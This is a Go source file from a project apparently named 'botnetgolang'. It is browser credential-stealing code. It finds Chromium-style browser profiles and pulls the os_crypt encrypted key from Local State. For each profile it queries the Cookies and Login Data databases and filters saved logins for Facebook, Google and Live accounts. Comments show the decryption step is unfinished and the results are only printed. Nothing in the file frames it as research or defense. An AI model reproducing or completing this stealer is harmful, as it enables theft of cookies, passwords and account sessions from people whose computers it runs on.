package internal

import (
	_const "botnetgolang/internal/const"
	"botnetgolang/internal/model"
	"botnetgolang/internal/pkg"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"os"
	"path/filepath"
	"strings"
)

const (
	Cfff = ".facebook.com"
	Cggg = "google.com"
	Clll = "live.com"
)

var jsonData []interface{}

func FunGetProfile(browser model.BrowserPaths) *model.AllProfile {
	var result model.AllProfile

	ppp := os.Getenv("APPDATA")
	if ppp == "" {
		ppp = os.Getenv("HOME")
	}
	part := strings.Split(ppp, "\\AppData")
	ppp = part[0]

	jsonData = append(jsonData, filepath.Join(ppp, "fffff"))

	pathfolderD := filepath.Join(ppp, browser.Pa)

	textF := "108.0.0.0"
	content, err := ioutil.ReadFile(filepath.Join(pathfolderD, "Last Version"))
	if err == nil {
		textF = string(content)
	}

	alls := make([]string, 0)
	if paths, err := pkg.GetDirectoriesV2(pathfolderD); err != nil {
		fmt.Print("loi")
	} else {
		for _, value := range paths {
			alls = append(alls, value)
		}

	}

	if err != nil {
		panic(err)
	}
	// lay cac profile
	result.Alls = alls
	result.PathSource = ppp
	result.UserData = pathfolderD
	result.Version = textF

	return &result
}

func MainBL(browser model.BrowserPaths) {
	allProfile := FunGetProfile(browser)
	if len(allProfile.Alls) < 0 {
		return
	}
	textF, err := pkg.ReadTextFile(allProfile.PathSource + browser.Local)
	if err != nil {
		return
	}
	var dataC map[string]interface{}
	err = json.Unmarshal([]byte(textF), &dataC)
	if err != nil {
		return
	}

	alltt := dataC["os_crypt"].(map[string]interface{})["encrypted_key"].(string)
	tt := alltt[5:]
	fmt.Println(tt)
	//fmt.Println(pkg.UnprotectData([]byte(tt)))

	// chua lay duoc secret key

	for _, profile := range allProfile.Alls {
		path := fmt.Sprintf("%v\\Network\\Cookies", profile)
		connToken, err := pkg.ConnectSQLite(path)
		if err != nil {
			fmt.Println(err)
		}
		fmt.Println(connToken)
		token, _ := pkg.QueryData(connToken, pkg.CookiesSQL)
		fmt.Println(token)
		jsonBytes, err := json.Marshal(token)
		jsonString := string(jsonBytes)
		fmt.Println(jsonString)
		//isLogin := pkg.CheckLogin(token)
		path = fmt.Sprintf("%v\\Login Data", profile)
		connInfo, err := pkg.ConnectSQLite(path)
		info, _ := pkg.QueryData(connInfo, pkg.Passwords)
		conditions := []interface{}{
			_const.Cfff,
			_const.Cggg,
			_const.Clll,
		}

		listInfo := pkg.FilterConditions(info, conditions, "action_url")
		fmt.Println(listInfo)
	}

}
